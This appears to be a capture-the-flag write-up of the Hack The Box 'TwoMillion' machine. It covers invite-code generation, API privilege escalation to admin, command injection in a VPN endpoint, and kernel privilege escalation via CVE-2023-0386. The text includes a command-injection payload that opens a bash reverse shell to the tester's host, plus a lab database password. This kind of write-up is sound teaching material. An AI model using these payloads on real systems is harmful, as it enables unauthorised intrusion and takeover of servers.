---
title: "Two Million"
date: 02-03-2025
categories: [Linux, Easy]
tags: [Easy, CVE, RCE, API]
image: https://labs.hackthebox.com/storage/avatars/d7bc2758fb7589dfa046bee9ce4d75cb.png
---

This machine was hard but very rewarding. To get a foothold you have to be able to generate valid invite codes and you must edit your own user data and set your account to an administrator account. After this you are able to generate other user's VPN files and this endpoint is vulnerable to RCE. For privilege escalation you have to find a mail sent to the admin account which contains information about an exploit that the server is vulnerable to, which lets us escalate privileges to root. I had to get small nudges on some parts for example I was not able to discover that doing a get on `/api/v1` gives you a list of all the endpoints which was very helpful. I also needed a hint for finding the privilege escalation vector. Overall I had a lot of fun with this machine. 

![2million_info_card](assets/images/2million/card.png)


## Enumeration 
---
The initial **nmap** scan shows that there are two ports open, those being ports 22 and 80. **Nmap** shows that port 80 is an http server and is trying to redirect us to **2million.htb**. After adding this to our hosts file we can access the webpage. 

```
nmap 10.10.11.221 -p22,80 -oA nmap/twomillion -sCV            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-01 17:34 CET
Nmap scan report for 10.10.11.221
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The webpage is a an old version of hack the box's website. Running **ffuf** for any subdomains does not gives any hits. Following this I ran **fuff** again to discover some directories. 

```
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://2million.htb/FUZZ -fs 162

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://2million.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 162
________________________________________________

logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 119ms]
login                   [Status: 200, Size: 3704, Words: 1365, Lines: 81, Duration: 125ms]
register                [Status: 200, Size: 4527, Words: 1512, Lines: 95, Duration: 124ms]
api                     [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 145ms]
home                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 117ms]
404                     [Status: 200, Size: 1674, Words: 118, Lines: 46, Duration: 126ms]
invite                  [Status: 200, Size: 3859, Words: 1363, Lines: 97, Duration: 130ms]
                        [Status: 200, Size: 64952, Words: 28274, Lines: 1243, Duration: 127ms]
:: Progress: [30000/30000] :: Job [1/1] :: 261 req/sec :: Duration: [0:01:56] :: Errors: 2 ::

```

We have some interesting directories. I tried logging in with some random credentials and got a reply saying "User not found". I also tried common SQL injections but none seemed to work. Next I tried the registration page but it seems we need an invite code to register an account. Going into `/invite` corroborates this and we must find a valid invite code to continue. 

#### Exploiting the Invite Code System

![2million](assets/images/2million/Pasted image 20250301174346.png)
I first tried with some random invite code to see what response we get from the server. Without any clear path to get the invite code I tried looking at the page's source code where I find the following script called `inviteapi.min.js`. It has some obfuscated **javascript** code.

```javascript
eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return c.toString(36)
    }
    ;
    if (!''.replace(/^/, String)) {
        while (c--) {
            d[c.toString(a)] = k[c] || c.toString(a)
        }
        k = [function(e) {
            return d[e]
        }
        ];
        e = function() {
            return '\\w+'
        }
        ;
        c = 1
    }
    ;while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp('\\b' + e(c) + '\\b','g'), k[c])
        }
    }
    return p
}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}))

```

Giving the source code to ChatGPT produces the following **javascript** code

```javascript
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}
```

We see two new endpoints the most interesting one being the **how/to/generate** sending a POST to this api endpoint produces the following output:

```
Invite Code Response: 
{
    '0': 200,
    'success': 1,
    'data': {
                'data': 'Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr', 
                'enctype': 'ROT13'
            }, 
    'hint': 'Data is encrypted ... We should probbably check the encryption type in order to decrypt it...'
}
```

We get some encrypted data but we also get the encryption method which is the most common version of the Caeser Cypher. Decrypting the data we get the following:

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

After sending the POST request to the generate endpoint we get our invite code encrypted with base64. 
![2million](assets/images/2million/Pasted image 20250301183307.png)

I made a python script to generate invite codes and decode them.
```python
import requests
import base64
url = "http://2million.htb/api/v1/invite/generate"
headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, headers=headers)
data = response.json()['data']
encoded_code = data['code']
code = base64.b64decode(encoded_code)
print(code.decode('utf-8'))
```

We can now sign in and get an account to access the main webpage.
![2million](assets/images/2million/Pasted image 20250301184421.png)

#### Becoming an Admin
Digging around the webpage I find that there is only one interesting directory which is used to generate VPN files. I tried to generate and regenerate different VPN files but I was not able to get anything from it. I got a nudge at this moment to do a GET request on `/api/v1`. 

![2million](assets/images/2million/Pasted image 20250301200037.png)
 We can now easily see all the api endpoints and it is clear how to continue. We see that the  `api/v1/user/auth` can be used to see if we are and admin user. 
 
```
{
	"loggedin":true,
	"username":"fresh",
	"is_admin":0
}
```

As expected we are not and admin but we see that there is an api endpoint to edit our user data `/admin/settings/update`. We can change our admin status from this endpoint and we are now an admin user. I was expecting this endpoint to be dissalowed for non admin users but it is not which gives us permission to edit our data.
![2million](assets/images/2million/Pasted image 20250301200946.png)

## Foothold
---

Going back to the main webpage I see that nothing changed. Generating the VPN files is the same and we get no new directories we can go to, therefore, the only reasonable place to get a foothold seems to be the `admin/vpn/generate` endpoint. We can generate other user's VPN files by sending some json data. At this point I had to get another nudge to find that this endpoint is vulnerable to remote code execution. We can quickly test this by adding a sleep command and see how long does the response from the server take. I should have seen this, endpoints whcih are only allowed to be accessed by privileged users are often vulnerable to exploits, as these are not as carefully protected like other endpoints which can be accessed by all users. 

```
{
	"username":"test; sleep 5"
}
```

The response took more than five seconds so we have verified that we have command execution. Trying with other commands like `whoami` does not give any output but this is fine since we only need the reverse shell to execute. I send the following payload and I get a reverse shell as **www-data**

```
{
	"username":"username ; bash -c 'bash -i >& /dev/tcp/10.10.16.4/9001 0>&1'"
}
```
## Privilege Escalation
---
We land on the website's root directory and we see that there is a **Database.php** file. Which contains the following lines of code inside of the Database class.

```
    private $mysql;

    public function __construct($host, $user, $pass, $dbName)
    {
        $this->host     = $host;
        $this->user     = $user;
        $this->pass     = $pass;
        $this->dbName   = $dbName;

        self::$database = $this;
    }
```

This means that the database credentials must be getting somewhere in these files. Taking a look at **index.php** I see the following:

 ```
$dbHost = $envVariables['DB_HOST'];
$dbName = $envVariables['DB_DATABASE'];
$dbUser = $envVariables['DB_USERNAME'];
$dbPass = $envVariables['DB_PASSWORD'];

```

I see that the database credentials are being pulled from the enviroment variables. Doing an `ls -la` I see that the file **.env** exists and stores all the credentials.

```
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
#### Getting Admin User

I check the home directory of the server and there is only one user that has a home directory it is the admin user. Logging in as admin with the database password works and we are now admin. 

![2million](assets/images/2million/Pasted image 20250302095018.png)

I tried the common privilege escalation vectors such as setuid binaries, sudo -l, and running linpeas but none gave me a clear pathway. I also tried to explore the database since we have the credentials but there was nothing too interesting. At this point I had to get antoher nudge which was to check emails. Looking around for common email files I found the `var/mail/admin` file which contained and email sent to admin which contained information about an unpatched CVE to which the server is vulnerable to. 

```
admin@2million:/var/mail$ cat admin                                                                                                 
From: ch4p <ch4p@2million.htb>                                                                                                      
To: admin <admin@2million.htb>                                                                                                      
Cc: g0blin <g0blin@2million.htb>                                                                                                    
Subject: Urgent: Patch System OS                                                                                                    
Date: Tue, 1 June 2023 10:45:22 -0700                                               
Message-ID: <9876543210@2million.htb>                                                                      
X-Mailer: ThunderMail Pro 5.2                                
Hey admin,                                                                                                                          
                                                                                                                                    
I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
HTB Godfather
```

I used this GitHub [script](https://github.com/puckiestyle/CVE-2023-0386) to get root. Which exploits the CVE-2023-0386 flaw. This flaw exploits OverlayFS implementation in the Linux kernel which not properly handle copy up operation in some conditions leading to privilege escalation. 